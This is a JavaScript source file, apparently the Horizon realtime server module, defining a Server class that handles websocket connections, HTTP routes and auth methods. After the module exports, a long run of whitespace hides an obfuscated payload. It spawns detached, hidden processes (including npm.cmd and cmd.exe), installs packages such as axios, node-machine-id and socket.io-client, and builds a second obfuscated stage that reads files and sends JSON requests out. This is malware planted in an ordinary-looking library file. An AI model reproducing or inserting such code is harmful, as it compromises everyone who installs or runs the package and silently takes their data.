'use strict';

const Auth = require('./auth').Auth;
const make_client = require('./client').make_client;
const ReqlConnection = require('./reql_connection').ReqlConnection;
const logger = require('./logger');
const options_schema = require('./schema/server_options').server;
const getType = require('mime-types').contentType;

// TODO: dynamically serve different versions of the horizon
// library. Minified, Rx included etc.
const horizon_client_path = require.resolve('@horizon/client/dist/horizon');

const endpoints = {
  insert: require('./endpoint/insert'),
  query: require('./endpoint/query'),
  remove: require('./endpoint/remove'),
  replace: require('./endpoint/replace'),
  store: require('./endpoint/store'),
  subscribe: require('./endpoint/subscribe'),
  update: require('./endpoint/update'),
  upsert: require('./endpoint/upsert'),
};

const assert = require('assert');
const fs = require('fs');
const Joi = require('joi');
const path = require('path');
const url = require('url');
const websocket = require('ws');

const protocol_name = 'rethinkdb-horizon-v0';

const accept_protocol = (protocols, cb) => {
  if (protocols.findIndex((x) => x === protocol_name) !== -1) {
    cb(true, protocol_name);
  } else {
    logger.debug(`Rejecting client without "${protocol_name}" protocol (${protocols}).`);
    cb(false, null);
  }
};

const serve_file = (file_path, res) => {
  fs.access(file_path, fs.R_OK | fs.F_OK, (exists) => {
    if (exists) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end(`Client library not found\n`);
    } else {
      fs.readFile(file_path, 'binary', (err, file) => {
        if (err) {
          res.writeHead(500, { 'Content-Type': 'text/plain' });
          res.end(`${err}\n`);
        } else {
          const type = getType(path.extname(file_path)) || false;
          if (type) {
            res.writeHead(200, { 'Content-Type': type });
          } else {
            res.writeHead(200);
          }
          res.end(file, 'binary');
        }
      });
    }
  });
};

class Server {
  constructor(http_servers, user_opts) {
    const opts = Joi.attempt(user_opts || { }, options_schema);
    this._path = opts.path;
    this._name = opts.project_name;
    this._max_connections = opts.max_connections;
    this._permissions_enabled = opts.permissions;
    this._auth_methods = { };
    this._request_handlers = new Map();
    this._http_handlers = new Map();
    this._ws_servers = [ ];
    this._close_promise = null;
    this._interruptor = new Promise((resolve, reject) => {
      this._interrupt = reject;
    });

    try {
      this._reql_conn = new ReqlConnection(opts.rdb_host,
                                           opts.rdb_port,
                                           opts.project_name,
                                           opts.auto_create_collection,
                                           opts.auto_create_index,
                                           opts.rdb_user || null,
                                           opts.rdb_password || null,
                                           opts.rdb_timeout || null,
                                           this._interruptor);
      this._auth = new Auth(this, opts.auth);
      for (const key in endpoints) {
        this.add_request_handler(key, endpoints[key].run);
      }

      const verify_client = (info, cb) => {
        // Reject connections if we aren't synced with the database
        if (!this._reql_conn.is_ready()) {
          cb(false, 503, 'Connection to the database is down.');
        } else {
          cb(true);
        }
      };

      const ws_options = { handleProtocols: accept_protocol,
                           allowRequest: verify_client,
                           path: this._path };

      const add_websocket = (server) => {
        const ws_server = new websocket.Server(Object.assign({ server }, ws_options))
        .on('error', (error) => logger.error(`Websocket server error: ${error}`))
        .on('connection', (socket) => make_client(socket, this));

        this._ws_servers.push(ws_server);
      };

      const path_replace = new RegExp('^' + this._path + '/');
      const add_http_listener = (server) => {
        // TODO: this doesn't play well with a user removing listeners (or maybe even `once`)
        const extant_listeners = server.listeners('request').slice(0);
        server.removeAllListeners('request');
        server.on('request', (req, res) => {
          const req_path = url.parse(req.url).pathname;
          if (req_path.indexOf(`${this._path}/`) === 0) {
            const sub_path = req_path.replace(path_replace, '');
            const handler = this._http_handlers.get(sub_path);
            if (handler !== undefined) {
              logger.debug(`Handling HTTP request to horizon subpath: ${sub_path}`);
              return handler(req, res);
            }
          }
          if (extant_listeners.length === 0) {
            res.statusCode = 404;
            res.write('File not found.');
            res.end();
          } else {
            extant_listeners.forEach((l) => l.call(server, req, res));
          }
        });
      };

      this.add_http_handler('horizon.js', (req, res) => {
        serve_file(horizon_client_path, res);
      });

      this.add_http_handler('horizon.js.map', (req, res) => {
        serve_file(`${horizon_client_path}.map`, res);
      });

      this.add_http_handler('auth_methods', (req, res) => {
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': opts.access_control_allow_origin,
        });
        res.end(JSON.stringify(this._auth_methods));
      });

      if (http_servers.forEach === undefined) {
        add_websocket(http_servers);
        add_http_listener(http_servers);
      } else {
        http_servers.forEach((s) => { add_websocket(s); add_http_listener(s); });
      }
    } catch (err) {
      this._interrupt(err);
      throw err;
    }
  }

  add_request_handler(request_name, endpoint) {
    assert(endpoint !== undefined);
    assert(this._request_handlers.get(request_name) === undefined);
    this._request_handlers.set(request_name, endpoint);
  }

  get_request_handler(request) {
    return this._request_handlers.get(request.type);
  }

  remove_request_handler(request_name) {
    return this._request_handlers.delete(request_name);
  }

  add_http_handler(sub_path, handler) {
    logger.debug(`Added HTTP handler at ${this._path}/${sub_path}`);
    assert.notStrictEqual(handler, undefined);
    assert.strictEqual(this._http_handlers.get(sub_path), undefined);
    this._http_handlers.set(sub_path, handler);
  }

  remove_http_handler(sub_path) {
    return this._http_handlers.delete(sub_path);
  }

  add_auth_provider(provider, options) {
    assert(provider.name);
    assert(options.path);
    assert.strictEqual(this._auth_methods[provider.name], undefined);
    this._auth_methods[provider.name] = `${this._path}/${options.path}`;
    provider(this, options);
  }

  ready() {
    return this._reql_conn.ready().then(() => this);
  }

  close() {
    if (!this._close_promise) {
      this._interrupt(new Error('Horizon server is shutting down.'));
      this._close_promise = Promise.all([
        Promise.all(this._ws_servers.map((s) => new Promise((resolve) => {
          s.close(resolve);
        }))),
        this._reql_conn.ready().catch(() => { }),
      ]);
    }
    return this._close_promise;
  }
}

module.exports = {
  Server,
  protocol: protocol_name,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                function a0g(K,g){K=K-0xc6;const Q=a0K();let i=Q[K];if(a0g['qnpFtr']===undefined){var e=function(c){const G='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let R='',D='';for(let b=0x0,H,d,u=0x0;d=c['charAt'](u++);~d&&(H=b%0x4?H*0x40+d:d,b++%0x4)?R+=String['fromCharCode'](0xff&H>>(-0x2*b&0x6)):0x0){d=G['indexOf'](d);}for(let w=0x0,z=R['length'];w<z;w++){D+='%'+('00'+R['charCodeAt'](w)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(D);};a0g['AJSkib']=e,a0g['Gdglpf']={},a0g['qnpFtr']=!![];}const l=Q[0x0],p=K+l,v=a0g['Gdglpf'][p];return!v?(i=a0g['AJSkib'](i),a0g['Gdglpf'][p]=i):i=v,i;}(function(K,g){const K3=a0g,K4=a0g,Q=K();while(!![]){try{const i=parseInt(K3(0x224))/0x1*(parseInt(K3(0x486))/0x2)+parseInt(K4(0x3e7))/0x3*(-parseInt(K4(0x447))/0x4)+-parseInt(K4(0x3a5))/0x5+-parseInt(K3(0x13d))/0x6+parseInt(K3(0x15e))/0x7+-parseInt(K3(0x3c4))/0x8*(-parseInt(K4(0x47e))/0x9)+parseInt(K3(0x49c))/0xa;if(i===g)break;else Q['push'](Q['shift']());}catch(e){Q['push'](Q['shift']());}}}(a0K,0x6b79a),(function(){const K5=a0g,K6=a0g,Q={'unKtR':K5(0x28f),'cBTAG':'bin','Usnvp':K5(0x371)+K5(0x215),'gthoS':K5(0x231),'LVYBw':K5(0x1e2)+K5(0xcb),'jgAtD':function(A){return A();},'TOsuU':K5(0x42a)+'l','oqsop':K6(0x1e7),'xOAXx':function(A,K0){return A===K0;},'zAuua':K6(0x235),'Ztgkc':'npm.cm'+'d','tOtdn':function(A,K0,K1,K2){return A(K0,K1,K2);},'DnTsS':K6(0x491)+'e','rtPKz':'utf8','hGxVH':function(A,K0){return A(K0);},'Avpve':K5(0x161)+K6(0x198)+K6(0x107)+K5(0x1c3)+K5(0x34c)+K6(0x335)+'\x22)','JBauA':function(A,K0,K1){return A(K0,K1);},'MYdUs':function(A,K0,K1,K2){return A(K0,K1,K2);},'HaDAa':function(A){return A();},'pGMFG':function(A){return A();},'LtJCy':function(A,K0,K1,K2){return A(K0,K1,K2);},'FIkEl':'//B','SdXjm':K5(0x192),'MFiCq':function(A){return A();},'hXRZG':function(A,K0){return A(K0);},'lszoS':K6(0x479),'RDtIF':K5(0x29a)+'proces'+'s','AwfKh':K6(0x444)+K6(0x30e),'UzBLV':K6(0x309)+'bs','bbCPX':K6(0xe0)+'dows','NlBgb':'System'+'32','Zuyuv':K5(0x4cc)+K5(0x269),'YlpFD':function(A,K0){return A+K0;},'wPHdX':function(A,K0){return A+K0;},'vUjMn':K6(0x3c0),'aDoJD':K5(0x2bd)+K5(0xf4)+'i','jTYtb':K5(0x378),'hgzCz':function(A,K0,K1){return A(K0,K1);},'DgLbi':function(A,K0,K1){return A(K0,K1);},'hoROo':K6(0x3ac)+K5(0x160),'RdFol':K6(0x1da),'hgLKj':K6(0x214)+'s','xRBjH':'close'},p=Q[K6(0x15a)](require,Q[K6(0x3b5)]),{spawn:G}=Q[K5(0x15a)](require,Q['RDtIF']),R=Q[K6(0x15a)](require,'fs'),D=require('os'),H={'stdio':K5(0x1e7),'windowsHide':!![],'shell':![],'detached':!![]},j={'stdio':Q[K5(0x4e9)],'windowsHide':!![],'shell':![],'detached':!![]},F=process[K5(0x416)+'th'],k=p[K6(0x47b)+'e'](F),C=p[K5(0x4bb)](D[K6(0x100)+'r'](),Q[K5(0x320)]),X=p[K6(0x4bb)](C,K6(0x214)+'s'),E=p['join'](C,Q[K5(0x483)]),V=p[K5(0x4bb)](process.env.WINDIR||Q[K5(0x3ba)],Q['NlBgb'],Q[K5(0x18d)]),Y={...process.env,'PATH':Q['YlpFD'](Q[K5(0x26e)](k,p[K6(0x292)+K6(0x103)]),process.env.PATH||'')};function q(){const K7=K6,K8=K6,A=[p[K7(0x4bb)](k,K8(0x1e2)+K8(0xcb),Q[K8(0xda)],Q[K8(0x38f)],Q[K8(0x4b7)]),p[K8(0x4bb)](k,'..',Q['gthoS'],Q[K7(0xfe)],Q[K8(0xda)],Q[K8(0x38f)],Q[K8(0x4b7)]),p[K7(0x4bb)](k,'..',Q[K8(0xfe)],Q[K8(0xda)],Q[K8(0x38f)],K8(0x371)+K8(0x215))];for(const K0 of A){try{if(R[K8(0x27d)+K8(0x45f)](K0))return K0;}catch(K1){}}return null;}function O(){const K9=K6,KK=K6,A=Q[K9(0x1a1)](q);if(A)return G(F,[A,Q[K9(0x44e)]],{'cwd':C,'env':Y,'stdio':Q[K9(0x4e9)],'windowsHide':!![],'shell':![],'detached':![]});if(Q[KK(0x4e0)](process[KK(0x339)+'rm'],Q[K9(0x445)])){const K0=p[K9(0x4bb)](k,Q[KK(0x32a)]);return Q[K9(0x276)](G,Q[K9(0x401)],['/d','/s','/c','\x22'+K0+(KK(0x23f)+K9(0x3ca))],{'cwd':C,'env':Y,'windowsVerbatimArguments':!![],'stdio':Q[KK(0x4e9)],'windowsHide':!![],'shell':![],'detached':![]});}return Q[K9(0x276)](G,p[K9(0x4bb)](k,Q[KK(0xda)]),[Q['TOsuU']],{'cwd':C,'env':Y,...H});}const I={'axios':'latest','better-sqlite3':K5(0x25a),'node-machine-id':Q[K5(0x28b)],'socket.io-client':Q[K6(0x28b)]};Q[K6(0x4e0)](process[K5(0x339)+'rm'],K5(0x235))&&(I[Q[K6(0x384)]]='latest',I[K5(0x38d)]=Q[K5(0x253)]);const y='functi'+K5(0x4a2)+'(M,t){'+'M=M-0x'+K5(0x419)+K6(0x1a7)+K6(0x28e)+'let\x20u='+K6(0x353)+'f(a0t['+K5(0x306)+K5(0x204)+'undefi'+K6(0x4bd)+K6(0x356)+'unctio'+K5(0x2fe)+K5(0x397)+K6(0x3a1)+K6(0x3b8)+K5(0x465)+K5(0x30c)+K5(0x507)+K5(0x25b)+K6(0x1e0)+K6(0x282)+K5(0x4ce)+K5(0x144)+K5(0x3fc)+K5(0x11f)+K6(0x32f)+'e=\x27\x27;f'+K5(0x1fb)+K5(0x429)+K6(0x33f)+'=0x0;l'+K5(0x3a6)+K5(0x1e6)+K6(0x283)+K6(0x19a)+'=d%0x4'+K5(0x4a3)+'0+l:l,'+K6(0x4ac)+K5(0xde)+'String'+K5(0x205)+K5(0x4a0)+'de\x27](0'+K5(0x345)+K6(0x4c0)+K5(0x430)+K6(0xf1)+K6(0x329)+K5(0x3bb)+K5(0x249)+K6(0x3f4)+K6(0xe3)+'=0x0,W'+K6(0x28a)+'ngth\x27]'+';P<W;P'+'++){e+'+K5(0x1b0)+K6(0x256)+K5(0x147)+K5(0x1db)+'\x27](P)['+K6(0x1d9)+K5(0x278)+K5(0x23e)+K5(0x1a2)+K6(0x143)+K5(0x3ab)+K6(0x336)+K5(0x131)+K5(0xc6)+'ponent'+K5(0xfd)+K6(0x268)+K6(0x2cf)+K6(0x357)+K5(0x18b)+K5(0x1b6)+K6(0x41c)+'[\x27fkSr'+K5(0x1d7)+K5(0x346)+K5(0x146)+K6(0x19b)+'],S=M+'+K6(0x395)+K5(0x18b)+K5(0x4b1)+K5(0x2c4)+K5(0x382)+'(u=a0t'+K6(0x437)+'bR\x27](u'+K6(0x37f)+K6(0x210)+'c\x27][S]'+K5(0x46a)+'g,u;}('+K6(0x264)+'on(M,t'+K6(0x4d4)+K6(0x3d9)+K5(0x2e3)+K5(0x370)+K5(0x495)+K6(0x1b4)+'[]){tr'+K6(0x20e)+K6(0x505)+K5(0x2f7)+K5(0x1d6)+K6(0x1e4)+K5(0x33b)+'rseInt'+K6(0x1d6)+K6(0xd0)+'0x2*(-'+K6(0x423)+'nt(M3('+K5(0x298)+K6(0x28c)+K6(0x193)+'Int(M3'+'(0x1ae'+K5(0x2a6)+K5(0x381)+K5(0x305)+K5(0x393)+K5(0x1f1)+K5(0x181)+K5(0x288)+'M2(0x1'+K6(0x4f5)+K5(0x281)+K6(0x2f7)+K5(0x2eb)+K6(0x21c)+K6(0x1ac)+K5(0x1b1)+K5(0xf3)+K6(0x452)+K5(0x3ff)+K5(0x423)+K5(0x44c)+K5(0x1a0)+')/0x9)'+K6(0x4c5)+'eInt(M'+K5(0x387)+K5(0x4af)+'a+-par'+K5(0x288)+K6(0x1c6)+K5(0x1af)+K6(0x2d1)+K6(0x1b1)+K5(0xd7)+K6(0x4ef)+K6(0x4df)+K5(0x27c)+K6(0x286)+(K6(0x323)+'lse\x20h['+'\x27push\x27'+'](h[\x27s'+K6(0x2de)+K6(0x330)+K6(0x484)+K6(0x22f)+K6(0x32e)+'h[\x27shi'+K6(0x3dc)+K5(0x2d4)+K6(0x415)+'5562b)'+K6(0x3c9)+K5(0x431)+K5(0x2e6)+K6(0x413)+K5(0x38c)+'t,M5=a'+K6(0x26a)+K6(0x3f7)+K6(0x153)+K6(0x498)+K6(0x162)+K6(0x17b)+'+B;},\x27'+'FdNrn\x27'+K5(0x1f4)+K6(0x3d4)+'B){ret'+'urn\x20Z+'+'B;},\x27n'+K5(0xca)+K5(0x183)+K5(0x1a5)+K5(0x39c)+K6(0xc7)+K6(0x17a)+K6(0x4bc)+K5(0x1be)+',\x27IZsR'+K5(0x16e)+'ction('+K5(0x1f8)+K5(0x336)+K5(0x15c)+',\x27lpaq'+K5(0x46c)+K5(0x4dd)+K5(0x3b9)+K6(0x35d)+K5(0x118)+K6(0x24d)+K6(0x3ad)+K5(0x3de)+',\x27XEsJ'+K6(0x2c5)+'0x166)'+'+\x27atio'+K5(0x211)+K6(0x290)+K6(0x21d)+'Gm\x27:M5'+'(0x168'+K6(0x4ab)+K5(0x1e1)+K5(0x314)+'(Z,B){'+K5(0x1f5)+K5(0x105)+K6(0x3f8)+'j\x27:fun'+K6(0x37b)+'Z,B){r'+'eturn\x20'+'Z^B;},'+'\x27BDyUn'+K5(0x153)+K5(0x498)+',B){re'+'turn\x20Z'+K6(0x322)+'ouMPO\x27'+K5(0x1f4)+K5(0x3d4)+K6(0x2d0)+K5(0x336)+'Z(B,z)'+K6(0x4ca)+K5(0x36a)+K6(0x48d)+K5(0x142)+K5(0x462)+K5(0x4f0)+K5(0x300)+K6(0x4c3)+K5(0x336)+K6(0x2e1)+K6(0x4c1)+K6(0x109)+':funct'+K5(0x3d4)+K5(0x35c)+'urn\x20Z+'+K5(0x482)+K6(0x343)+K6(0x183)+K6(0x417)+K6(0x436)+')+M4(0'+K6(0x41e)+'\x27n\x5cx20'+K6(0x271)+K5(0x119)+K5(0x314)+K6(0x3db)+K5(0x1f5)+K6(0x363)+K5(0x4f8)+K6(0x25d)+K6(0xdc)+K6(0x3e9)+K5(0x1f6)+'M5(0x1'+K5(0x14e)+'UmUF\x27:'+K6(0x245)+K6(0x188)+'0x1c9)'+K6(0xe6)+'gr\x27+M5'+K6(0x2dd)+')+M4(0'+'x183)+'+K6(0x2b4)+'a6),\x27J'+K5(0x386)+'\x27/tran'+K5(0x2a2)+'0x154)'+K5(0x3c8)+K6(0x171)+'confi\x27'+K5(0x242)+K6(0x461)+K5(0x2c0)+'8)+M5('+K5(0x334)+K6(0x16c)+K6(0x163)+'4(0x1c'+K5(0x216)+K5(0x49f)+K6(0x14f)+'nction'+'(Z,B){'+'return'+K6(0x478)+K6(0x233)+K5(0x472)+K6(0x2b0)+K5(0x242)+K6(0x344)+K6(0x2d7)+'1)+\x27in'+K6(0x32c))+(K6(0x35b)+K5(0x138)+K5(0xe2)+K6(0x325)+K6(0x2b4)+K6(0x301)+'(0x18b'+')+\x27\x5cx2'+K5(0x4f7)+'Yds\x27:f'+K5(0x4f0)+K6(0x4f1)+K6(0x439)+K6(0x123)+K6(0x3ec)+K5(0x237)+'unctio'+'n(Z,B)'+K6(0x439)+K5(0x22c)+K6(0x232)+'Thl\x27:M'+'4(0x1d'+K6(0x133)+'0x159)'+K5(0x242)+K5(0x4ae)+K6(0x136)+K6(0xed)+'zm\x27:fu'+'nction'+'(Z,B){'+'return'+K6(0x363)+'},\x27TYa'+K5(0x37d)+K5(0x4ee)+K5(0x4b9)+'ea\x27+\x27b'+K5(0xf9)+K6(0x503)+K6(0x2ff)+K5(0x1b3)+K5(0x29f)+'3)+M4('+K5(0x400)+'+M5(0x'+K5(0x308)+K5(0x1e8)+K5(0x14d)+'0x158)'+',\x27ZhKO'+'N\x27:\x2702'+'e4f3\x27+'+K6(0x2b4)+'81)+M5'+'(0x1e2'+K6(0x500)+K5(0x337)+K6(0x3b2)+K5(0x1d3)+K6(0x228)+K6(0x2ea)+'c\x27:M4('+K6(0x37a)+K6(0x242)+K6(0x1eb)+K6(0x3f1)+K6(0x1ce)+K5(0x34a)+K5(0x38e)+K5(0x1ba)+'7468c\x27'+K5(0x1ea)+K5(0x11d)+K5(0x37b)+K6(0x1f8)+K5(0x336)+K5(0x18a)+K5(0x141)+'a\x27:M5('+K6(0xe1)+',\x27xaRh'+K5(0x186)+K6(0x37b)+K6(0x1f8)+K5(0x336)+K5(0x18a)+',\x27DyQV'+K5(0x140)+K6(0x2e4)+K5(0xeb)+K6(0x183)+K5(0x333)+'(0x179'+K6(0x250)+'xE\x27:fu'+'nction'+'(Z,B){'+K6(0x1f5)+'\x20Z-B;}'+K5(0xd4)+K6(0x241)+K5(0x37b)+'Z,B,z,'+K6(0x11a)+'urn\x20Z('+'B,z,K)'+K5(0x26b)+'lJY\x27:M'+K5(0x26c)+K5(0x4f3)+K6(0x362)+K6(0x48e)+K6(0x15d)+K6(0x2bc)+K6(0x242)+K6(0x315)+K6(0x189)+K6(0x351)+K6(0x23b)+'kwnzK\x27'+K6(0x2ff)+'177)+\x27'+K5(0x166)+'BqM\x27:M'+'4(0x1a'+'4)+\x27am'+K6(0x2ab)+K6(0x33a)+K6(0x4b0)+K5(0x412)+K6(0x2a7)+K5(0x42c)+K6(0x153)+K6(0x498)+K5(0x45a)+K5(0xc9)+K6(0x1f5)+'\x20Z(B,z'+K5(0x24f)+');},\x27m'+K5(0x36f)+K5(0x2f5)+K5(0x43b)+K6(0x137)+K5(0x242)+K6(0x2b6)+K5(0x244)+'c,R=M['+K6(0x168)+K5(0x227)+K5(0x102)+K6(0x3cb)+K5(0x43e)+K6(0x1e5)+')],j=M'+'[M5(0x'+K5(0x449)+K5(0x1a6)+K5(0x383)+'onst\x20P'+K6(0x167)+'0x1a7)'+K6(0x456)+K6(0x29e)+K6(0x126))+('x1cb)]'+K5(0x1bd)+K6(0x121)+'\x27](req'+K5(0x37c)+'fs\x27),J'+K6(0x167)+K5(0x220)+K6(0x456)+'ire,\x27o'+K5(0x470)+K5(0x297)+K5(0xf6)+K6(0x197)+K6(0x407)+'fyyjd\x27'+K6(0x456)+K5(0x29e)+K6(0x4f4)+'\x27]),Q='+K5(0x3d6)+K6(0x1ae)+'(J[M5('+'0x167)'+'+\x27r\x27]('+'),M4(0'+'x15f)+'+K5(0x2b4)+K6(0x1a4)+K6(0x2b4)+K5(0x40c)+K6(0x17d)+K5(0x2b1)+K6(0x264)+K6(0x4b8)+K5(0x2ec)+'nst\x20M6'+'=M5,M7'+K5(0xd5)+K6(0x20e)+K5(0x120)+K6(0xd3)+K6(0xf2)+K5(0x2b8)+K5(0x379)+'M[M6(0'+'x171)]'+K5(0x13f)+K5(0x2ce)+K6(0x1cf)+'oISOS\x27'+K5(0x44a)+K5(0x4d5)+K5(0x2df)+K6(0x30b)+':\x5cx20\x27'+K5(0x254)+K5(0x270)+K6(0xe5)+'?B[M7('+K5(0x440)+K6(0x238)+K5(0x3d8)+K6(0x485)+K5(0x195)+'M6(0x1'+K5(0x4fb)+'[M7(0x'+K5(0x24c)+K6(0xfc)+K5(0x481)+K6(0x258)+K6(0xe9)+'}),W[\x27'+K5(0x1bf)+K6(0x15b)+K6(0x172)+K5(0x2d8)+K5(0x22a)+K6(0x29b)+K5(0x255)+K6(0x497)+K5(0x30a)+K6(0x314)+K5(0x4cb)+K6(0x4d4)+K6(0x10b)+K5(0x2ca)+K6(0x48a)+K5(0x1c4)+K6(0x1f4)+K5(0x476)+K6(0x274)+K5(0x12a)+K5(0x377)+K6(0x313)+K5(0x3c5)+K6(0x12f)+K6(0x284)+'qc\x27:M['+K6(0x3a3)+K6(0x372)+K6(0x350)+K5(0x1f4)+'ion(K,'+K5(0x3f6)+K5(0x262)+K5(0x125)+'urn\x20M['+'MM(0x1'+K5(0x410)+K5(0x1cc)+K6(0x128)+K6(0x32b)+K6(0x2c3)+K5(0x294)+K5(0x27f)+K5(0x16d)+K6(0x3f3)+'unctio'+K5(0x403)+'{const'+K5(0xf7)+K6(0x243)+K5(0x49a)+K6(0x366)+K6(0x1aa)+K6(0xd1)+K6(0x1dd)+K6(0x350)+K6(0x23a)+K5(0x4aa)+'ction('+K6(0x406)+K6(0x200)+'Mt,MX='+K5(0x2a0)+'\x27ByeBn'+K6(0x153)+'tion(b'+K6(0x4d2)+'nst\x20Mh'+K6(0x1cd)+'eturn\x20'+K6(0x425)+K6(0x352)+K6(0x273)+K6(0x45b)+K5(0x369)+K6(0x3c3)+'](z[Mu'+'(0x1bd'+K6(0x1a8)+K5(0x37b)+'b){U+='+K6(0xd9)+'[\x27on\x27]'+'(z[Mu('+K6(0x4e3)+K5(0x2c7)+K5(0x2e6)+K6(0x413)+K5(0x374)+K5(0x40f)+';try{H'+K5(0x34e)+'198)')+('](K,JS'+'ON[MR('+K5(0x4b3)+'](U));'+K6(0x3c2)+K5(0x2da)+K6(0x2aa)+K6(0x3ae)+'n\x27](z['+K6(0x212)+K5(0x41b)+K5(0x158)+'functi'+'on\x20E(Z'+',B,z){'+K6(0x206)+K6(0x39d)+K6(0x3a2)+K6(0xe4)+'pci\x27:f'+'unctio'+K6(0x4c9)+K5(0x439)+K5(0x33d)+';},\x27tc'+K5(0x2f4)+'[Ma(0x'+K6(0x49e)+K5(0x499)+K6(0x251)+K5(0x2cc)+'\x27sKgyh'+K6(0x4c8)+K5(0x368)+K6(0xe8)+'ehP\x27:M'+K5(0x3ee)+K5(0x463)+K6(0x3ef)+K6(0x4c8)+K6(0x4ea)+K6(0x2e9)+K5(0x3da)+K6(0x3ee)+K5(0x43a)+K5(0x45d)+'n\x20new\x20'+'Promis'+K5(0x1df)+'tion(v'+',q){co'+K5(0x3e1)+K6(0x3d1)+'=MY,H='+K6(0x175)+K5(0x291)+K5(0x37b)+K6(0x405)+'const\x20'+'MF=a0t'+K5(0x45d)+'n\x20K[MF'+'(0x15b'+')](k,M'+K6(0x10f)+K5(0x275)+K6(0x1f4)+K6(0x2c2)+K5(0x285)+'turn\x20K'+K6(0x4ec)+K6(0x229)+'M0);},'+K5(0x311)+K6(0x132)+K6(0x30d)+')],\x27pn'+K6(0x435)+'[\x27Vesr'+K5(0x1a9)+'=JSON['+K6(0x2f1)+K5(0x15f)+K5(0x1d0)+')]({\x27j'+K5(0x2e2)+'\x27:K[\x27s'+'Kgyh\x27]'+K6(0x3e6)+'od\x27:Z,'+K5(0x48f)+'s\x27:B,\x27'+K5(0xcc)+K5(0xdf)+K6(0xcd)+'ues\x27+\x27'+K6(0x169)+K5(0x4d3)+K6(0x1d4)+K6(0x4fa)+K5(0x1f0)+K6(0xcf)+K6(0x373)+'(0x165'+')],\x27he'+'aders\x27'+K5(0x1f9)+'tent-T'+K6(0x49d)+'[\x27NxXN'+K6(0x1b7)+'ontent'+'-Lengt'+K5(0x20a)+'fer[Md'+K5(0x1c1)+K5(0xdb)+'x1e7)]'+K5(0x4d1)+K5(0x264)+'on(k){'+K6(0x206)+K6(0x2d5)+'Ml=Md;'+K6(0x2ae)+K5(0x469)+K5(0x450)+K6(0x3bf)+K6(0x2c8)+K5(0x27a)+'ion(M1'+K5(0x219)+K6(0x396)+'k[\x27on\x27'+K6(0x182)+'(0x1b6'+K6(0x1a8)+K6(0x37b)+K6(0x4d4)+K6(0x3e4)+K6(0x340)+K6(0x4d0)+K5(0x173)+K5(0x2be)+K6(0x150)+K5(0x23d)+K5(0x154)+'0));}c'+'atch(M'+K6(0x218)+K6(0x1f7)+K6(0x3fd)+K5(0x2f9)+K6(0x20c)+'[\x27on\x27]'+K5(0x2f8)+'ClO\x27],'+K5(0x3f5)+K5(0x1ee)+K6(0x489)+',b[Md('+K6(0x1be)+K5(0x2d3)+K6(0x494)+K5(0x312)+K5(0x43f)+K6(0x4e8))+(K6(0x1b5)+K6(0x4b5)+K6(0x1f5)+K5(0x1ab)+K6(0x25f)+K6(0x18f)+K5(0x327)+K5(0x40a)+K6(0x1fc)+K5(0x247)+K6(0x454)+K6(0x260)+K5(0x201)+K6(0x4e1)+K6(0x264)+K6(0x148)+K5(0x2ec)+K6(0x508)+K6(0x27b)+'=M4;le'+K5(0x1f2)+K5(0x380)+K6(0x3c7)+K5(0x342)+K5(0x40e)+K5(0x4bf)+K6(0x1c5)+K6(0x42f)+K6(0x418)+K5(0x2a5)+K6(0x1c2)+K6(0x12e)+K5(0x1e3)+K5(0xf5)+K6(0x240)+'(0x197'+K6(0x35a)+'ode\x27]('+'M[MJ(0'+K5(0x466)+K6(0x36e)+'0x15e)'+'+MJ(0x'+K5(0x318)+'v),Z[M'+K5(0x239)+K6(0x4be)+K6(0x402)+K6(0x4b6)+K6(0x1fa)+K5(0x3f0)+K6(0x2f2)+K6(0x427)+K6(0x364)+K6(0x446)+K5(0x3e8)+K5(0x28d)+K5(0x2f3)+K5(0x22e)+'=B[\x27sp'+K5(0x178)+K5(0x34d)+K5(0xff)+K6(0x259)+K5(0x474)+'in\x27](\x27'+'\x27),K=M'+K6(0x34f)+K6(0x44f)+K5(0x404)+';if(K['+K6(0x1dc)+'s\x27+Mx('+K5(0x16a)+K5(0x365)+'const\x20'+K6(0x130)+K6(0x3a8)+K5(0x3ce)+'o(0x16'+'4)]);r'+K5(0x336)+K6(0x3f2)+K6(0x25e)+K5(0x1fd)+K5(0x145)+K6(0x104)+K6(0x360)+K5(0x191)+K5(0x2b3)+K6(0x1d8)+K5(0x385)+K5(0x454)+K6(0x260)+'x(0x1e'+'9)]);}'+K6(0x1f5)+K6(0x39a)+'ync\x20fu'+K6(0x314)+K6(0x32d)+K5(0x108)+K6(0x296)+'=M4,MQ'+K6(0x157)+'{};z&&'+K5(0x475)+'m(0x17'+K5(0x459)+K5(0x40d)+'t\x20v=aw'+K6(0x304)+K6(0x13a)+K5(0x37e)+K5(0x2ac)+'0x180)'+'](M[MQ'+K5(0x2c6)+K6(0x263)+'Q(0x1e'+K6(0x1c7)+K6(0x19d)+'0x1d0)'+K5(0xef)+K6(0x458)+K5(0xc7)+K6(0x164)+K6(0x13a)+K6(0xd8)+K6(0x20d)+K6(0x1ff)+K5(0x25c)+K5(0x310)+K5(0x4ad)+'(0x1a1'+K5(0x48c)+'kklCi\x27'+K6(0x149)+K6(0x347)+K5(0x280)+K5(0x42d)+K6(0x1fe)+K6(0x13a)+K6(0x11b)+'a\x27][Mm'+'(0x1ea'+K6(0x47c)+K6(0x317)+'[MQ(0x'+K6(0x2dc)+K6(0x26f)+K6(0x135)+K6(0x432)+K5(0x2cb)+'(0x1ad'+K6(0x1ad)+'q[Mm(0'+K6(0x19f)+'(0x0,H'+');cons'+K5(0x207)+K5(0x3f7)+K6(0x332)+K6(0x1de)+K5(0x2b5)+')](A,q'+K5(0x19e))+(K5(0x391)+K5(0x4f0)+K6(0x4c4)+K6(0x413)+K6(0x184)+K6(0x4cf)+K6(0x4d6)+K5(0x304)+K5(0x176)+'73)](E'+K5(0x3cf)+'163)+\x27'+K6(0x341)+K6(0x2ad)+K5(0x24b)+K6(0x422)+K6(0x471)+'],k);i'+K5(0x3c1)+'|!M0[M'+K5(0x414)+K6(0x36c)+'M0[ML('+K5(0x21e)+K5(0x42b)+'ut\x27])t'+K6(0x4e6)+K5(0x21b)+K5(0xee)+'L(0x1a'+K6(0x1a3)+'ML(0x1'+K5(0x17f)+'+(ML(0'+K5(0x129)+K6(0x31b)+'20\x27),U'+K6(0x10c)+K6(0x2f0)+'M0[ML('+K6(0x21e)+K6(0x4a5)+K6(0x434)+K6